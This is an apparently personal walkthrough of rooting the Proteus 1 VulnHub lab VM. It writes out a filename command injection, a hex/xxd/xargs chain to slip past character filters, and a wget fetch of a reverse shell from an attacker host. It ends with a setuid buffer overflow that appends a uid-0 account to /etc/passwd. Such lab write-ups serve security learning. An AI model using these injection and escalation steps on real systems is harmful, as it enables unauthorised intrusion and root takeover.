# Proteus 1 Vulnhub Walkthrough

## Intro

Below you will find a walkthrough of the Proteus 1 VM. This was a fun and challenging machine. This page is full of fun spoilers, so if you're 
still attemping to root the machine, try harder :). Without further ado, let's dive in. 

## Download and Find It

Download the Proteus VM from [VulnHub](https://www.vulnhub.com/entry/proteus-1,193/), load it up, and pick your favorite tool. For quick identification, I use nmap.  

`nmap 192.168.2.0/24 -sP Starting Nmap 7.70 ( https://nmap.org )  `  
`Nmap scan report for Proteus (192.168.2.180)Host is up (0.23s latency).`

## Start Enumeration

I use a series of scripts to gather most of the information for me. Reconscan by Mike Czumak does an nmap script and starts work on additional modules depending on what ports are determined to be open. There are three main ports open: 22, 80, and 5355

> PORT     STATE SERVICE REASON         VERSION  
> 22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
> | ssh-hostkey:   
> |   2048 40:3e:c5:6f:dc:63:c5:af:43:51:28:5c:05:f5:98:c2 (RSA)  
> | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwD5BkuUf9zDQ1+TkrK0K9VffoH9cCm9OPa215nFtfOejQkf7k3ppxkKqZxlbsOZje5pp9y5gv4EMeAatn1BL2KbMlT96UW0tcFyC8uRJdFITpd1LnzusucVvpP5qa29gyNVJrx/scsdE9bIwB++toL4kSbX40kbUA4u+26qqKXyPaaO7SMo0VxM+7E4l5ZXIV9kfVo6SYcCTHo/WG48iSrbe1UGQg3VR0xxtU9OZg/oiS7BHvqracFTn71Obp+KaN6KA8R3NKQcxA+FSlr1jOVmr3q1b6++RAij4jajwafC1iu0tcy9WkhTrXBLbtmPJ2WI4/8cKO4zhuW0Z2eieD  
> |   256 bb:9c:b0:3c:ff:48:8a:2b:37:d2:fe:2e:78:ce:8c:a9 (ECDSA)  
> | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFLxp5pS3QOLUV+Mfsyeak4GLeciDrUVshZbJEzKKGu/IPOxzNzkVna0IcfGCyRfzfJp1/R6I3k4CdKj6wD2Xo4=  
> |   256 ff:85:4e:91:29:da:d1:1b:b3:11:26:5b:d8:c0:7a:f8 (EdDSA)  
> |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDA1x1iCaJYag2vwfBSvDU1ffJ+WtKs4kWCJe/mLxBFm  
> 80/tcp   open  http    syn-ack ttl 64 Apache httpd  
> | http-methods:   
> |_  Supported Methods: GET HEAD  
> |_http-server-header: Apache  
> |_http-title: Proteus | v 1.0  
> 5355/tcp open  llmnr?  syn-ack ttl 1  

Nikto and Dirb scans are kicked off for port 80. Let's continue exploring the website.

## Proteus

Fire up Burp and head to the web page. 

![Proteus_home](/imgs/proteus_homepage.png)

First notes are that there is a file upload, which is always fun to play with, and a login. 
Some quick auth bypass tries and sqlmap bear no fruit, so I focus on the main function and upload some files. If you upload something 
that doesn't fit the MIME type, Proteus gets mad at you and rejects. When you get a successful upload, Proteus brings you to 
the /samples page. 

![Proteus_successful_upload](/imgs/default_sucessful_upload.png)

Proteus changes our file name to a base64 encoded value, runs strings, and runs objdump on our file. That's nice of them. I can also 
see under objdump our file name (stored in /home/malwareadm/samples/). 

Looking at the POST in Burp, we have name="file"; and filename="file.bin" that we can mess with. 

![Burp_submit_request](/imgs/burp_submit_request.png)

I tried messing around wtih base64 encoded filenames first, but it's always better to keep it simple. Test for command injection in the 
filename parameter. filename="file.bin;id" works when you reload your webpage. 

![Id_cmd_inj_test](/imgs/id_cmd_inj_test.png)

## Messing With Command Injection

This part gave me quite a bit of trouble. The site takes the parameter of filename (currently set to file.bin;id), converts it to a 
random string (and keeps the extension if possible), and then runs base64 on it. It is useful that we know the name of our file as we 
can use it to access our own payloads on the server if  need be. 

I needed to generate a 'bad characters' list as some commands would not pass through. The website makes this pretty simple and fails 
obviously when testing. 

**Good chars**

![good_chars](/imgs/good_chars.png)

**Bad chars**

![bad_chars](/imgs/bad_chars.png)

Most of the commands that would give us further access require either '/' for files or a '.' for an ip address. I could open a port 
with nc, but I couldn't actually connect or interact with it afterwards. Looking back at the good character list, we have access to 
pipe. Essentially, if we can string together a set of commands, encoded or otherwise, we can create complex commands for execution.

After much trial and error I'm left with the following: `echo <hex encoded command> | xxd -r -p | xargs -i{} sh -c '{}'`

Taking hex encoded values, I can pass it to xxd (which also handles the encoding), and finally pass it to xargs which can handle the 
execution by bassing to sh. It was easy passing encoded values; however, they wouldn't execute (or if they did it was blind). 
I also ran into an issue that the server changes the filename parameter to all lower case. Initially I messed with xargs -I, 
but the server didn't like it. The xargs -i[replace] functionality is apparently deprecated (check man) in favor of -I, so I'm glad 
I had a version (4.7.0) that still had it. 

## Arbitrary Command Injection

It's easy to create hex encoded commands. I also created a quick script to help double check my work and possibly handle other use 
cases (though be wary of my shaky script abilites). Let's check again to see everything working. Here is the payload with 
'cat /etc/passwd'

![etc_passwd_cmd_injection](/imgs/etc_passwd_cmd_injection.png)

Now we can try to put a reverse shell in. The current account doesn't have write access to the web directory, so I needed to put it 
somewhere else. wget supports this with -O. `wget -O /tmp/simpleshell.py http://<IP ADDR>/simpleshell.py`
Encode it, send it, and double check the file was recieved. You can always look at your own apache access.log to see if the GET was 
successful, or you can 'ls' the /tmp directory. 

![already_exec_shell](/imgs/already_executable_shell.png)

So now all I have to do is throw up a listner and execute the shell.

![connect](/imgs/successful_rshell_connect.png)

## >_Terminal

Once inside you can explore around to your heart's content. There are some config files with credentials and a test admin login that 
can be used for the web page. There is even a RSA private key (password protected) (see some stuff in /imgs/interesting_snip\*). Keep 
exploring and you'll eventually find a quaint file: admin_login_logger. Check it's permissions and notice anything special? 
The sticky bit is set and the owner is root. I nc it over to my machine for further testing. 

admin_login_logger takes a parameter and writes it to a log file. 

![logger_test](/imgs/logger_test_input.png)

Nothing too special, but user input is a fickle thing. I generated a junk pattern and pass it into the logger to see interesting 
effects. 

![overflow](/imgs/logger_overflow.png)

An overflow occurs and I actually overwrite the file location and file name. Cool. So I have the ability to write to any file as 
root with a certain space for a payload. A few things to note about the overflow: 
 - it starts user input with a new line
 - the user input is appended to the end of the file
 - the user has limited space for the payload
 - the user has limited space in the file name for the path and file
 - the pattern offset is 456 based on the name of the file created when I hit the first overflow 
 
With these notes in mind, I can craft a payload. I fire up python interpreter for some quick work.  
`def pad(len):`  
    `pad="A"` * `len`  
    `return pad`  
  
`def gen():`  
    `payload=userInput + pad(patternCustomLen-len(userInput)) + fileToOverwrite`  
    `print payload`

I initially thought I could overwrite the /etc/passwd file and remove the root account password, but this is when I found that 
the overflow just appends user input to the end. It also doesn't handle new lines very well either. Another easy thing to do is 
add an account to the machine. I crafted a user without a password and the machine still wouldn't let me su. 

Then, hashed a password (I used openssl passwd), created a user, su ... and fail because the overflow overwrote the : shell : 
section of /etc/passwd and the machine didn't know what to give me. 

![almost_final_payload](/imgs/almost_final_userInput_payload.png)

![failed_login](/imgs/failed_proteus_login_root.png)
 
Finally, here is the user input section of the final payload: `<username>:<password>:0:0::/tmp/`

![fina_payload](/imgs/final_userInput_payload.png)
 
Now to su <username>, type the password, and pop to a root shell.
 
![proteus_root](/imgs/successful_proteus_login_root.png)
 
Now you can find the flag and display it. 
 
![flag](/imgs/flag.png)
 
##  Final comments

Overall I had a lot of, albeit frustrating, fun. I needed the practice and learned some things along the way. 
The system gives a lot of leeway to the user because it executes commands in so many places and even grants them execute 
rights (see nice_proteus_exec_help\* in imgs). 
Crafting the original injection is probably the hardest part. Now onto the next one.
